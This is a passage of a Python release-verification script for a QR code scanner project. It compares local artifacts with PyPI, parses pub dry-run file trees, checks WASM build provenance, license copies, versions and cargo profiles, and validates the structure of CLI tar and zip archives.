        files[name] = (digest, entry.get("yanked") is True)
    return files


def cmd_pypi_live(host: Host) -> None:
    """Every file given that PyPI already serves at this version is that very
    file (sha256), and PyPI serves no other file there. python › release runs
    it on the inspected set right before the upload, whose skip-existing then
    skips only files proven identical: twine skips a live file by name alone."""
    if not host.args.files:
        print("pypi-live: give at least one file", file=sys.stderr)
        sys.exit(2)
    art = host.add(Artifact(f"PyPI files at {PYPI_NAME} {host.version}", "pypi-live"))
    local, unknown = {}, []
    for name in host.args.files:
        path = pathlib.Path(name)
        if path.is_file() and path.name.endswith((".whl", ".tar.gz")) and path.name not in local:
            local[path.name] = sha256(path.read_bytes())
        else:
            unknown.append(name)
    art.check("every file given is a wheel or an sdist, each name once", not unknown, ", ".join(unknown))
    question = f"PyPI's JSON for {PYPI_NAME} {host.version} read (a 404: no such version, nothing live)"
    try:
        live = pypi_live_files(host)
    except (OSError, ValueError) as err:
        art.check(question, False, str(err))
        return
    art.check(question, True, "404" if live is None else f"{len(live)} file(s) at this version")
    live = live or {}

    def yanked(name: str) -> str:
        return " (yanked)" if live[name][1] else ""

    same = sorted(n for n in local if n in live and live[n][0] == local[n])
    differ = sorted(n for n in local if n in live and live[n][0] != local[n])
    extra = sorted(set(live) - set(local))
    art.listing = ([f"{n}: on PyPI, identical{yanked(n)}" for n in same]
                   + [f"{n}: on PyPI, other bytes" for n in differ]
                   + [f"{n}: not on PyPI yet" for n in sorted(set(local) - set(live))]
                   + [f"{n}: on PyPI, not in the local set{yanked(n)}" for n in extra])
    art.check("every local file PyPI already serves is byte-identical to it (sha256)", not differ,
              "; ".join(f"{n}: PyPI sha256 {live[n][0][:16]}… ≠ local {local[n][:16]}…" for n in differ)
              or f"{len(same)} identical on PyPI, {len(local) - len(same)} not on PyPI yet")
    art.check(f"PyPI serves no file at {host.version} that the local set does not hold", not extra,
              "; ".join(f"{n}{yanked(n)}" for n in extra))


# ---------------------------------------------------------------- flutter


def parse_pub_tree(output: str) -> list:
    """File leaves of the tree `pub publish --dry-run` prints.

    Current pub draws `├── name (1 KB)` rows with `│   ` indents; older pub
    drew `|-- name` / `'-- name` with `|   `.
    """
    rows = []
    for line in re.sub(r"\x1b\[[0-9;]*m", "", output).splitlines():
        found = re.match(r"^((?:[│| ]   )*)(?:[├└]──|[|'`]--) (.+)$", line)
        if found:
            name = re.sub(r" \(<?[\d.]+ [KMG]?B\)$", "", found.group(2).strip())
            rows.append((len(found.group(1)) // 4, name))
        elif re.match(r"^[│| ├└'`]*[├└|'][─-]", line):
            raise ValueError(f"unparsed pub tree row: {line!r}")
    leaves, stack = [], []
    for i, (depth, name) in enumerate(rows):
        if depth > len(stack) or "/" in name or "\\" in name or name in (".", ".."):
            raise ValueError(f"invalid pub tree row: {depth}: {name!r}")
        del stack[depth:]
        stack.append(name)
        if i + 1 == len(rows) or rows[i + 1][0] <= depth:
            leaves.append("/".join(stack))
    if len(leaves) != len(set(leaves)):
        raise ValueError("duplicate pub tree leaves")
    return leaves


@functools.cache
def wasm_provenance():
    spec = importlib.util.spec_from_file_location("wasm_provenance", ROOT / "scripts" / "wasm_provenance.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def check_wasm_build(art: Artifact, files: dict, version, package) -> None:
    """One physical WASM, and it is the recorded, current build of this checkout, recorded under
    this package's name (PACKAGE) and this module's file name."""
    modules = sorted(name for name in files if name.endswith(".wasm"))
    art.check(f"exactly one WASM binary ({WASM_MODULE})", modules == [WASM_MODULE], ", ".join(modules))
    try:
        info = json.loads(files.get("build-info.json", b""))
    except ValueError as error:
        art.check("build-info.json records this build", False, f"unreadable: {error}")
        return
    if not isinstance(info, dict):
        art.check("build-info.json records this build", False, f"not an object: {type(info).__name__}")
        return
    path = (info.get("wasm") or {}).get("path") if isinstance(info.get("wasm"), dict) else None
    art.check(f"build-info.json wasm.path is {WASM_MODULE}", path == WASM_MODULE, f"{path!r}")
    wasm = files.get(WASM_MODULE, b"")
    problems = wasm_provenance().check(info, wasm, version, ROOT, package=package)
    art.check("WASM bytes, compiled inputs and feature envelope match build-info.json, recorded under this "
              "package's name (no stale, modified or renamed build)", not problems, " · ".join(problems))
    if not problems:
        art.notes.append(f"build-info: wasm sha256 {info['wasm']['sha256']} · inputs {info['inputs']['sha256']} "
                         f"· features {', '.join(info['wasm']['features']) or 'none'} · revision {info.get('source_revision')}")


@functools.cache
def flutter_staging():
    spec = importlib.util.spec_from_file_location("flutter_staging", ROOT / "scripts" / "stage-flutter-package.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def read_flutter_file(root: pathlib.Path, name: str) -> bytes:
    flutter_staging().safe_name(name)
    path = root
    for part in pathlib.PurePosixPath(name).parts:
        path = path / part
        if path.is_symlink():
            raise ValueError(f"symlink in pub package: {name}")
    if not path.is_file() or path.stat().st_nlink != 1:
        raise ValueError(f"not a regular, unlinked pub file: {name}")
    return path.read_bytes()


def check_flutter_sources(art: Artifact, root: pathlib.Path, listing: list, snapshot: dict, revision: str) -> dict:
    staging = flutter_staging()
    binding = staging.subfiles(snapshot, staging.BINDING)
    files = {name: read_flutter_file(root, name) for name in [*binding, ".pubignore"]}
    files.update({f"{staging.VENDOR}/{name}": data
                  for name, data in staging.read_tree(root / staging.VENDOR).items()})
    unpublished_example_lock = "example/pubspec.lock" in binding and "example/pubspec.lock" not in listing
    metadata = staging.verify_staged(files, snapshot, revision, unpublished_example_lock=unpublished_example_lock)
    if unpublished_example_lock:
        art.notes.append("example/pubspec.lock is absent from the pub file tree; runtime app lock not part of published-byte identity")
    published = {name: read_flutter_file(root, name) for name in listing}
    required = {name for name in files if not any(part.startswith(".") for part in pathlib.PurePosixPath(name).parts)
                and pathlib.PurePosixPath(name).name != "pubspec.lock"}
    required.add(f"{staging.VENDOR}/.cargo_vcs_info.json")
    missing, extra = sorted(required - set(published)), sorted(set(published) - set(files))
    art.check("pub includes the complete bundled core and binding sources", not missing, ", ".join(missing))
    art.check("pub includes only candidate files and staging output", not extra, ", ".join(extra))
    staging.validate_paths(published)
    art.sha256 = staging.digest(published)
    art.size = sum(len(data) for data in published.values())
    art.notes.append(f"candidate {revision}; bundled core sha256 {metadata['core-content-sha256']}")
    return published


def cmd_flutter(host: Host) -> None:
    package_root = pathlib.Path(host.args.package_root).resolve() if host.args.package_root else FLUTTER_DIR
    pubspec = (package_root / "pubspec.yaml").read_text()
    found = re.search(r"^version:\s*(\S+)", pubspec, re.MULTILINE)
    version = found.group(1) if found else None
    found = re.search(r"^name:\s*(\S+)", pubspec, re.MULTILINE)
    name = found.group(1) if found else None
    art = host.add(Artifact(f"pub {name} {version}", "pub"))
    art.check(f"pubspec version = {host.version} (workspace)", version == host.version, f"{version}")
    # The pub name and the README's availability sentence change together
    # with the Dart package itself; until a release set is inspected, the
    # name and that sentence are reported as notes, not refused.
    readme = package_root / "README.md"
    readme_data = readme.read_bytes() if readme.is_file() else None
    if host.args.release_set:
        art.check(f"pubspec name is {FLUTTER_NAME} (never the retired {RETIRED_MODULE})", name == FLUTTER_NAME,
                  f"{name}")
    else:
        art.notes.append(f"pubspec name {name}: {FLUTTER_NAME} is required with --release-set")
        hits = availability_claims(readme_data)
        if hits:
            art.notes.append(f"README.md states availability ({', '.join(hits)}): refused with --release-set")
    check_readme(art, readme_data, ("pub", name), pending=host.args.release_set)
    binary = host.args.flutter or which("flutter") or which("dart")
    listing = []
    art.path = rel(package_root)
    try:
        staging = flutter_staging()
        manifests = {path.relative_to(package_root).as_posix(): read_flutter_file(
            package_root, path.relative_to(package_root).as_posix()) for path in package_root.rglob("Cargo.toml")
            if not {"target", ".dart_tool", "build"}.intersection(path.relative_to(package_root).parts)}
        staging.validate_paths(manifests)
        art.check("all recursive Rust path dependencies stay inside the package", True)
    except (OSError, ValueError, KeyError) as error:
        art.check("all recursive Rust path dependencies stay inside the package", False, str(error))
    if binary:
        proc = host.run("pub-publish-dry-run", [binary, "pub", "publish", "--dry-run"], cwd=package_root, timeout=900)
        summary = re.search(r"Package has (\d+) warnings?(?: and \d+ hints?)?\.\s*\Z", proc.stdout)
        warning_only = proc.returncode == 65 and summary and int(summary.group(1)) > 0
        art.check("pub validator completes without errors", proc.returncode == 0 or warning_only, tail(proc, 4))
        if summary:
            art.notes.append(f"pub validator: {summary.group(0).strip()}")
        try:
            listing = parse_pub_tree(proc.stdout)
        except ValueError as error:
            art.check("pub file tree parses completely", False, str(error))
        art.check("pub publish --dry-run prints a parsed file tree", bool(listing))
    else:
        art.unavailable("Flutter/Dart SDK absent; pub validator and published file tree NOT VERIFIED")
        return
    art.listing = sorted(listing)
    if not listing:
        return
    art.check("LICENSE at the package root", "LICENSE" in listing)
    check_license(art, (package_root / "LICENSE").read_bytes() if (package_root / "LICENSE").is_file() else None,
                  "Flutter package LICENSE")
    for required in ("README.md", "CHANGELOG.md", "pubspec.yaml", "rust/Cargo.toml"):
        art.check(f"{required} in the package", required in listing)
    check_stray(art, listing)
    crate = tomllib.loads((package_root / "rust" / "Cargo.toml").read_text())
    rxing = crate.get("profile", {}).get("release", {}).get("package", {}).get("rxing", {})
    art.check("rust/Cargo.toml keeps rxing overflow-checks (cargokit builds it as its own root)",
              rxing.get("overflow-checks") is True, f"profile.release.package.rxing = {rxing}")
    try:
        revision = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=ROOT, text=True).strip()
        published = check_flutter_sources(art, package_root, listing, staging.candidate_snapshot(ROOT, revision), revision)
        art.check("published sources, bundled core, versions, LICENSE and cargokit cache identity match this candidate", True)
        host.recorded.extend((sha256(data), str(package_root / name)) for name, data in sorted(published.items()))
    except (OSError, ValueError, KeyError, subprocess.CalledProcessError) as error:
        art.check("published sources, bundled core, versions, LICENSE and cargokit cache identity match this candidate", False, str(error))


# ---------------------------------------------------------------- licenses · versions


def cmd_licenses(host: Host) -> None:
    art = host.add(Artifact("LICENSE copies", "licenses"))
    want = LICENSE.read_bytes()
    art.path, art.sha256, art.size = "LICENSE", sha256(want), len(want)
    for copy in LICENSE_COPIES:
        path = ROOT / copy
        same = path.is_file() and path.read_bytes() == want
        if not same and host.args.sync:
            path.write_bytes(want)
            same = True
            art.notes.append(f"synced {copy}")
        art.check(f"{copy} byte-identical to LICENSE", same, "" if same else "missing or different (--sync)")
    art.listing = list(LICENSE_COPIES)
    # A Windows checkout (core.autocrlf=true, Git for Windows' default) would
    # write every copy with CRLF, and the win_amd64 wheel would ship that text,
    # which no longer matches the LF root. .gitattributes pins them to LF.
    paths = ["LICENSE", *LICENSE_COPIES]
    proc = subprocess.run(["git", "check-attr", "text", "eol", "--", *paths],
                          cwd=ROOT, capture_output=True, text=True)
    attrs: dict = {}
    for line in proc.stdout.splitlines():
        path, attr, value = line.rsplit(": ", 2)
        attrs.setdefault(path, {})[attr] = value
    loose = [p for p in paths if attrs.get(p) != {"text": "set", "eol": "lf"}]
    art.check("every copy checks out with LF on every platform (.gitattributes: LICENSE text eol=lf)",
              proc.returncode == 0 and not loose,
              f"git check-attr exit {proc.returncode}: {proc.stderr.strip()}" if proc.returncode
              else "; ".join(f"{p}: {attrs.get(p)}" for p in loose))


def _toml_version(path: str, *keys: str):
    node = tomllib.loads((ROOT / path).read_text())
    for key in keys:
        node = node.get(key, {}) if isinstance(node, dict) else {}
    return node if isinstance(node, str) else None


def _regex_version(path: str, pattern: str):
    found = re.search(pattern, (ROOT / path).read_text(), re.MULTILINE)
    return found.group(1) if found else None


# The manifests each publish job ships from (xtask sync-version rewrites them;
# mobile.yml checks them on every push).
SURFACES = (
    ("workspace", "Cargo.toml", lambda p: _toml_version(p, "workspace", "package", "version")),
    ("cli core pin", "crates/qrcode-ai-scanner-cli/Cargo.toml",
     lambda p: _toml_version(p, "dependencies", "qrcode-barcode-scanner", "version")),
    ("node package.json", "crates/qrcode-ai-scanner-node/package.json",
     lambda p: json.loads((ROOT / p).read_text()).get("version")),
    ("python crate", "crates/qrcode-ai-scanner-py/Cargo.toml", lambda p: _toml_version(p, "package", "version")),
    ("uniffi crate", "crates/qrcode-ai-scanner-uniffi/Cargo.toml", lambda p: _toml_version(p, "package", "version")),
    ("flutter pubspec", "bindings/flutter/pubspec.yaml", lambda p: _regex_version(p, r"^version:\s*(\S+)")),
    ("flutter rust crate", "bindings/flutter/rust/Cargo.toml", lambda p: _toml_version(p, "package", "version")),
    ("kotlin module", "bindings/kotlin/qrcodeaiscanner/build.gradle.kts",
     lambda p: _regex_version(p, r'^version\s*=\s*"([^"]+)"')),
)


def cmd_versions(host: Host) -> None:
    art = host.add(Artifact(f"version surfaces {host.version}", "versions"))
    for label, path, read in SURFACES:
        found = read(path)
        art.check(f"{label} = {host.version}", found == host.version, f"{path}: {found}")
    tag = host.args.tag
    if tag:
        tag = tag.removeprefix("refs/tags/")
        art.check(f"tag {tag} names the workspace version", tag == f"v{host.version}", f"workspace {host.version}")
        dated = re.compile(rf"^## {re.escape(host.version)} — \d{{4}}-\d{{2}}-\d{{2}}", re.MULTILINE)
        art.check(f"CHANGELOG.md has a dated '## {host.version} — YYYY-MM-DD' section",
                  bool(dated.search((ROOT / "CHANGELOG.md").read_text())))


# ---------------------------------------------------------------- profiles

# Every cargo build root that compiles rxing into something we ship. Cargo
# reads [profile] from the root manifest only, so each excluded crate must
# restate the workspace's release profile itself. `-p` takes a Cargo package
# name: the published CLI crate's, and the never-published node and wasm
# binding crates', which kept theirs.
PROFILE_ROOTS = (
    ("workspace · node + cli", ["--manifest-path", "Cargo.toml",
                                "-p", "qrcode-ai-scanner-node", "-p", "qrcode-barcode-scanner-cli"]),
    ("workspace · wasm32", ["--manifest-path", "Cargo.toml", "-p", "qrcode-ai-scanner-wasm",
                            "--target", "wasm32-unknown-unknown"]),
    ("python (maturin)", ["--manifest-path", "crates/qrcode-ai-scanner-py/Cargo.toml"]),
    ("uniffi (kotlin · swift)", ["--manifest-path", "crates/qrcode-ai-scanner-uniffi/Cargo.toml", "--lib"]),
    ("flutter (cargokit)", ["--manifest-path", "bindings/flutter/rust/Cargo.toml"]),
)
PROFILE_FIELDS = ("opt_level", "lto", "codegen_units", "debug_assertions", "overflow_checks", "panic", "strip")


def unit_name(unit: dict) -> str:
    pkg_id = unit.get("pkg_id", "")
    if "#" in pkg_id:  # registry+https://…#rxing@0.9.1 · path+file:///…#0.9.0
        tail_part = pkg_id.rsplit("#", 1)[1]
        name = tail_part.split("@", 1)[0]
        if re.fullmatch(r"\d+\.\d+\.\d+.*", name):  # path ids omit the name when it matches the dir
            name = pkg_id.rsplit("#", 1)[0].rstrip("/").rsplit("/", 1)[-1]
        return name
    return pkg_id.split(" ", 1)[0]


def profile_row(unit: dict) -> dict:
    prof = unit.get("profile", {})
    return {field: prof.get(field) for field in PROFILE_FIELDS}


def nightly_toolchain(host: Host):
    if host.args.nightly:
        return host.args.nightly
    if not which("rustup"):
        return None
    proc = subprocess.run(["rustup", "toolchain", "list"], capture_output=True, text=True)
    names = [line.split()[0] for line in proc.stdout.splitlines() if line.startswith("nightly")]
    return names[0] if names else None


def cmd_profiles(host: Host) -> None:
    nightly = nightly_toolchain(host)
    roots = [(label, ["--locked", *selector]) for label, selector in PROFILE_ROOTS]
    try:
        crate = host.target_dir() / "package" / f"qrcode-barcode-scanner-cli-{host.version}.crate"
        if crate.is_file():
            with tarfile.open(crate) as archive:
                archive.extractall(host.scratch / "cli-crate", filter="data")
            packaged_cli = host.scratch / "cli-crate" / f"qrcode-barcode-scanner-cli-{host.version}"
            # The packaged lock pins the core as packaged from this tree, which
            # the registry does not hold until release: resolve fresh instead
            # (profiles apply by package name, whatever version resolves).
            (packaged_cli / "Cargo.lock").unlink(missing_ok=True)
            roots.append(("cargo install qrcode-barcode-scanner-cli (the packaged crate as its own root)",
                          ["--manifest-path", str(packaged_cli / "Cargo.toml")]))
    except RuntimeError:
        pass
    for label, selector in roots:
        art = host.add(Artifact(f"release profile · {label}", "profile"))
        if not nightly:
            art.unavailable("no nightly toolchain (`--unit-graph` is unstable)")
            continue
        proc = host.run(f"unit-graph-{label}", host.cargo_cmd(
            f"+{nightly}", "build", "--release", "--unit-graph", "-Z", "unstable-options", *selector))
        if proc.returncode != 0:
            art.check("cargo --unit-graph", False, f"exit {proc.returncode}: {tail(proc)}")
            continue
        graph = json.loads(proc.stdout)
        units = [u for u in graph.get("units", []) if u.get("mode") == "build"
                 and "custom-build" not in u.get("target", {}).get("kind", [])]
        roots_idx = graph.get("roots", [])
        root_units = [graph["units"][i] for i in roots_idx]
        rxing = [u for u in units if unit_name(u) == "rxing"]
        art.notes.append(f"via cargo +{nightly} build --release --unit-graph (no compilation)")
        rows = [("root " + unit_name(u), profile_row(u)) for u in root_units]
        rows += [("rxing", profile_row(u)) for u in rxing[:1]]
        art.listing = [f"{who}: " + ", ".join(f"{k}={v}" for k, v in row.items()) for who, row in rows]
        art.check("rxing compiled with overflow-checks", bool(rxing) and all(
            u["profile"].get("overflow_checks") is True for u in rxing),
            f"{len(rxing)} rxing unit(s): overflow_checks={[u['profile'].get('overflow_checks') for u in rxing]}")
        art.check("root units unwind on panic (the engine wrapper catches panics)",
                  all(u["profile"].get("panic") == "unwind" for u in root_units),
                  f"{[u['profile'].get('panic') for u in root_units]}")
        art.check("root units at opt-level 3", all(str(u["profile"].get("opt_level")) == "3" for u in root_units))


# ---------------------------------------------------------------- CLI release files

# What a v* release carries for the command line: one prebuilt qrscan archive
# per target, a git archive of the same commit (the corresponding source) and
# one SHA256SUMS over those six. Each file is judged as given; nothing here
# builds, signs or uploads.
CLI_PACKAGE = "qrcode-barcode-scanner-cli"
# The CLI crate's name up to 0.10.1: a release file named after it is still
# read as a CLI release file, so that it fails by name.
CLI_RETIRED = "qrcode-ai-scanner-cli"
CLI_TARGETS = {  # triple: archive extension
    "x86_64-unknown-linux-gnu": "tar.gz",
    "aarch64-unknown-linux-gnu": "tar.gz",
    "x86_64-apple-darwin": "tar.gz",
    "aarch64-apple-darwin": "tar.gz",
    "x86_64-pc-windows-msvc": "zip",
}
CLI_KINDS = frozenset({"cli", "cli-source", "cli-sums"})
CLI_ARCHIVE = re.compile(r"qrcode-barcode-scanner-cli-(?P<version>[^-]+)-(?P<triple>.+?)\.(?P<ext>tar\.gz|zip)")
CLI_SOURCE = re.compile(r"qrcode-barcode-scanner-cli-(?P<version>.+)-source\.tar\.gz")
CLI_SUMS = re.compile(r"qrcode-barcode-scanner-cli-(?P<version>.+)-SHA256SUMS")
CLI_SUMS_LINE = re.compile(r"(?P<sha256>[0-9a-f]{64})  (?P<name>[^\s/\\]+)")
FULL_COMMIT = re.compile(r"[0-9a-f]{40}|[0-9a-f]{64}")
# The members below each archive's one top directory, which is named like the
# archive: tracked files copied verbatim, then what assembly generates.
CLI_COPIES = {
    "LICENSE": "LICENSE",
    "LICENSE-APACHE-2.0": "crates/qrcode-ai-scanner/LICENSE-APACHE-2.0",
    "LICENSING.md": "LICENSING.md",
    "README.md": "distribution/cli/README.md",
    "THIRD-PARTY.md": "crates/qrcode-ai-scanner/THIRD-PARTY.md",
}
CLI_GENERATED = ("COPYRIGHT-rust-std.html", "SOURCE.md", "THIRD-PARTY-LICENSES.txt", "build-info.json")
# Build-host paths and a plan directory, which no text member may hold (ASCII
# case ignored). Private markers never appear here: they arrive at run time
# through --forbid.
CLI_LEAKS = ("/home/runner", "/Users/runner", "runneradmin", "D:\\a\\", "/__w/", "/home/", "/Users/", "C:\\Users\\",
             "/private/var/folders/", "plans/")
CLI_BUILD_INFO = "qrscan-build-info/1"
BUILD_INFO_KEYS = {  # "" is the top level
    "": frozenset({"schema", "name", "package", "version", "target", "source", "toolchain", "linker", "profile",
                   "rustflags", "command", "deployment_target", "builder", "binary", "dependencies",
                   "build_dependencies"}),
    "source": frozenset({"repository", "ref", "tag", "commit", "source_date_epoch", "cargo_lock_sha256", "dirty"}),
    "toolchain": frozenset({"rustc", "cargo", "std_notice_sha256"}),
    "builder": frozenset({"runner_os", "runner_arch", "image_os", "image_version", "workflow_run"}),
    "binary": frozenset({"path", "sha256", "size"}),
}
DEPENDENCY_KEYS = frozenset({"name", "version", "source", "checksum", "license"})
# In every linked inventory: an inventory read wrong cannot pass empty.
CLI_ANCHORS = ("clap", "image", "rqrr", "rxing", "serde_json")
# build-info names each --remap-path-prefix source by placeholder, never by
# the build host's path; the row flags follow.
CLI_PLACEHOLDERS = ("<cargo-home>", "<checkout>", "<target-dir>")
CLI_ROW_FLAGS = {"x86_64-unknown-linux-gnu": ["-Clinker-features=-lld"],
                 "x86_64-pc-windows-msvc": ["-Ctarget-feature=+crt-static"]}
CLI_DEPLOYMENT_TARGETS = {"x86_64-apple-darwin": "10.15", "aarch64-apple-darwin": "11.0"}
CLI_UNWINDERS = ("zig-libunwind", "libgcc_s")
THIRD_PARTY_FIELDS = (("license", r".+"), ("source", r"\S+"), ("checksum", r"[0-9a-f]{64}"),
                      ("texts", r"[0-9a-f]{64}(?: [0-9a-f]{64})*"))
THIRD_PARTY_TEXT = re.compile(r"--- text (?P<sha256>[0-9a-f]{64}) (?P<size>\d+) bytes ---")


def cli_kind(name: str):
    """The CLI release kind a file name claims (its grammar is judged later), or None. The retired
    prefix claims a kind too: the CLI inspection then refuses the file by its name."""
    if not name.startswith((CLI_PACKAGE + "-", CLI_RETIRED + "-")):
        return None
    if name.endswith("-SHA256SUMS"):
        return "cli-sums"
    if name.endswith("-source.tar.gz"):
        return "cli-source"
    return "cli" if name.endswith((".tar.gz", ".zip")) else None


def check_cli_name(art: Artifact, name: str) -> None:
    art.check(f"name does not start with the retired {CLI_RETIRED}-", not name.startswith(f"{CLI_RETIRED}-"), name)


def cli_usage(args) -> str:
    """Why the CLI options do not fit the files given (a usage error), or ''."""
    kinds = {cli_kind(pathlib.Path(name).name) for name in args.files} - {None}
    options = {"--commit": args.commit, "--sums-sha256": args.sums_sha256, "--source-tree": args.source_tree,
               "--forbid": args.forbid}
    if not kinds:
        given = [flag for flag, value in options.items() if value is not None]
        return f"{', '.join(given)}: only with CLI release files" if given else ""
    if args.commit is None or not FULL_COMMIT.fullmatch(args.commit):
        return f"CLI release files need --commit, a full lowercase commit id (got {args.commit!r})"
    if "cli-source" in kinds and args.source_tree is None:
        return "the source archive needs --source-tree, a checkout of --commit"
    if args.sums_sha256 is not None and not re.fullmatch(r"[0-9a-f]{64}", args.sums_sha256):
        return f"--sums-sha256 {args.sums_sha256!r} is not 64 lowercase hex"
    if args.sums_sha256 is not None and "cli-sums" not in kinds:
        return "--sums-sha256 needs the SHA256SUMS file among the files"
    if any(not value.strip() for value in args.forbid or []):
        return "--forbid needs a non-blank string"
    return ""


def obj(value) -> dict:
    return value if isinstance(value, dict) else {}


@functools.cache
def lock_packages() -> dict:
    """{(name, version): package} of the workspace Cargo.lock."""
    lock = tomllib.loads((ROOT / "Cargo.lock").read_text())
    return {(package.get("name"), package.get("version")): package for package in lock.get("package", [])}


def workspace_repository():
    return root_manifest()["workspace"]["package"].get("repository")


@functools.cache
def rust_pin():
    """The one RUST_TOOLCHAIN, from ci.yml's top-level env (the publish guard holds every workflow to it)."""
    found = re.search(r'^  RUST_TOOLCHAIN:\s*"?(\d+\.\d+\.\d+)"?\s*$',
                      (ROOT / ".github" / "workflows" / "ci.yml").read_text(), re.MULTILINE)
    return found.group(1) if found else None


@functools.cache
def root_manifest() -> dict:
    """The root Cargo.toml, parsed once (never changed by a caller)."""
    return tomllib.loads((ROOT / "Cargo.toml").read_text())


def cli_profile() -> dict:
    """The release profile build-info records: the root manifest's, cargo's defaults elsewhere (a fresh dict:
    callers may change it)."""
    release = root_manifest().get("profile", {}).get("release", {})
    return {"opt_level": str(release.get("opt-level", 3)), "lto": release.get("lto", False),
            "codegen_units": release.get("codegen-units", 16), "strip": release.get("strip", False),
            "panic": release.get("panic", "unwind"),
            "overflow_checks": {name: package["overflow-checks"] for name, package in
                                sorted(release.get("package", {}).items()) if "overflow-checks" in package}}


@functools.cache
def deny_allowed() -> frozenset:
    """deny.toml's license allow list, each entry with single spaces."""
    allow = tomllib.loads((ROOT / "deny.toml").read_text()).get("licenses", {}).get("allow", [])
    return frozenset(" ".join(entry.split()) for entry in allow)


def dos_time(epoch: int) -> tuple:
    """A zip entry's date_time for EPOCH: UTC, seconds rounded down to even."""
    moment = datetime.datetime.fromtimestamp(epoch, datetime.timezone.utc)
    return (moment.year, moment.month, moment.day, moment.hour, moment.minute, moment.second - moment.second % 2)


def spdx_allowed(expression: str, allowed: frozenset) -> bool:
    """Whether some choice in EXPRESSION (OR, AND, WITH, parentheses, legacy `/` for OR) needs only ALLOWED
    licenses, each `ID` or `ID WITH EXCEPTION` exactly; ValueError when it does not parse."""
    tokens = re.findall(r"[()/]|[^\s()/]+", expression)
    pos = 0

    def peek(*words: str) -> bool:
        return pos < len(tokens) and (tokens[pos] in words or tokens[pos].upper() in words)

    def take() -> str:
        nonlocal pos
        if pos >= len(tokens):
            raise ValueError(f"{expression!r} ends early")
        pos += 1
        return tokens[pos - 1]

    def simple() -> bool:
        token = take()
        if token == "(":
            value = either()
            if take() != ")":
                raise ValueError(f"unbalanced parentheses in {expression!r}")
            return value
        if token in ("(", ")", "/") or token.upper() in ("OR", "AND", "WITH"):
            raise ValueError(f"a license expected at {token!r} in {expression!r}")
        if peek("WITH"):
            take()
            exception = take()
            if exception in ("(", ")", "/") or exception.upper() in ("OR", "AND", "WITH"):
                raise ValueError(f"an exception expected at {exception!r} in {expression!r}")
            return f"{token} WITH {exception}" in allowed
        return token in allowed

    def both() -> bool:
        values = [simple()]
        while peek("AND"):
            take()
            values.append(simple())
        return all(values)

    def either() -> bool:
        values = [both()]
        while peek("OR", "/"):
            take()
            values.append(both())
        return any(values)

    value = either()
    if pos != len(tokens):
        raise ValueError(f"unexpected {tokens[pos]!r} in {expression!r}")
    return value


def gunzip(raw: bytes) -> tuple:
    """(the data of RAW's first gzip member, how the stream differs from the one writer's: header flags 0 (no
    FNAME, FEXTRA, FCOMMENT or FHCRC), mtime 0, OS byte 255, nothing after the member). ValueError or
    zlib.error when RAW is no complete gzip stream."""
    if raw[:3] != b"\x1f\x8b\x08":
        raise ValueError("not a gzip (deflate) stream")
    problems = []
    if raw[3] & 0x08:
        problems.append("gzip FNAME set (a file name in the header)")
    if raw[3] & 0xF7:
        problems.append(f"gzip flags {raw[3] & 0xF7:#04x} set (FTEXT, FHCRC, FEXTRA or FCOMMENT)")
    if int.from_bytes(raw[4:8], "little"):
        problems.append(f"gzip mtime {int.from_bytes(raw[4:8], 'little')}, not 0")
    if raw[9] != 255:
        problems.append(f"gzip OS byte {raw[9]}, not 255")
    stream = zlib.decompressobj(wbits=31)
    data = stream.decompress(raw) + stream.flush()
    if not stream.eof:
        raise ValueError("the gzip stream is cut short")
    if stream.unused_data:
        problems.append(f"{len(stream.unused_data)} byte(s) after the gzip member")
    return data, problems


def ustar_problems(raw: bytes, members: list, global_headers: dict) -> list:
    """How the tar stream RAW differs from plain POSIX ustar: a pax global or per-member header, a GNU header
    or magic, or a member type other than a regular file or a directory."""
    problems = [f"a pax global header ({', '.join(sorted(global_headers))})"] if global_headers else []
    end = 0
    for member in members:
        block = raw[member.offset:member.offset + 512]
        if member.offset != end or member.offset_data != member.offset + 512:
            problems.append(f"{member.name}: an extended (pax or GNU) header before it")
        if block[257:265] != b"ustar\x0000":
            problems.append(f"{member.name}: magic {bytes(block[257:265])!r}, not POSIX ustar")
        if block[156:157] not in (b"0", b"5"):
            problems.append(f"{member.name}: header type {bytes(block[156:157])!r}")
        end = member.offset_data + member.size + (-member.size % 512)
    return problems


def read_cli_tar(path: pathlib.Path) -> tuple:
    """A CLI .tar.gz → (TarInfo list, {name: bytes} of regular files, the tar bytes, gzip problems, pax
    global headers)."""
    tar, problems = gunzip(path.read_bytes())
    with tarfile.open(fileobj=io.BytesIO(tar)) as archive:
        members = archive.getmembers()
        files = {m.name: archive.extractfile(m).read() for m in members if m.isfile()}
        global_headers = dict(archive.pax_headers)
    return members, files, tar, problems, global_headers


def read_cli_zip(path: pathlib.Path) -> tuple:
    """A CLI .zip → (ZipInfo list, {name: bytes} of the files it can read, problems): one clean stream of
    stored or deflated entries, each local header where the central directory says, no byte between them."""
    raw, problems, files = path.read_bytes(), [], {}
    with zipfile.ZipFile(io.BytesIO(raw)) as archive:
        infos = archive.infolist()
        names = [info.orig_filename for info in infos]
        problems += [f"{name}: a duplicate entry" for name in sorted({n for n in names if names.count(n) > 1})]
        if archive.comment:
            problems.append("an archive comment")
        end = 0
        for info in sorted(infos, key=lambda i: i.header_offset):
            name, kind = info.orig_filename, (info.external_attr >> 16) & 0o170000
            problems += [f"{name!r}: {why}" for bad, why in (
                ("\\" in name, "a backslash"), ("\0" in name, "a NUL byte"),
                (name.startswith("/") or re.match(r"[A-Za-z]:", name) is not None, "an absolute name"),
                (".." in name.split("/"), "a `..` component"), (kind == 0o120000, "a symlink"),
                (info.flag_bits & 0x1, "encrypted"), (info.flag_bits & 0x8, "a data descriptor"),
                (info.compress_type not in (zipfile.ZIP_STORED, zipfile.ZIP_DEFLATED),
                 f"compression {info.compress_type} (stored or deflate only)"),
                (info.extra, "an extra field"), (info.comment, "an entry comment")) if bad]
            local = raw[info.header_offset:info.header_offset + 30]
            encoded = name.encode("utf-8" if info.flag_bits & 0x800 else "cp437")
            name_size, extra_size = int.from_bytes(local[26:28], "little"), int.from_bytes(local[28:30], "little")
            if local[:4] != b"PK\x03\x04" or raw[info.header_offset + 30:][:name_size] != encoded:
                problems.append(f"{name!r}: no matching local header at its offset")
            if extra_size:
                problems.append(f"{name!r}: a local extra field")
            if info.header_offset != end:
                problems.append(f"{name!r}: {info.header_offset - end:+d} byte(s) before its local header")
